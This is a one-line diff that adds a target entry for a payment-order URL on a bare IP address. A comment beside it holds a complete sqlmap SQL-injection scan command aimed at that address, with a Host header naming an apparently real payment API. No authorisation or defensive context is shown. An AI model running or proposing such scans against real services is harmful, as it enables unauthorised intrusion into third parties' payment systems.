@@ -1,0 +1,1 @@
+https://104.18.28.225/ps/?order_id=ord_eLmCUiIhCDtqgAkD (GET)  # C:\Users\WINDOWS10\AppData\Local\Programs\Python\Python314\Scripts\sqlmap -u https://104.18.28.225/ps/?order_id=ord_eLmCUiIhCDtqgAkD -H "Host: pay-api.aghanim.com" --force-ssl --batch --level=1 --risk=1 --threads=1 --delay=1 --timeout=20 --retries=1 --output-dir=artifacts/sqlmap2
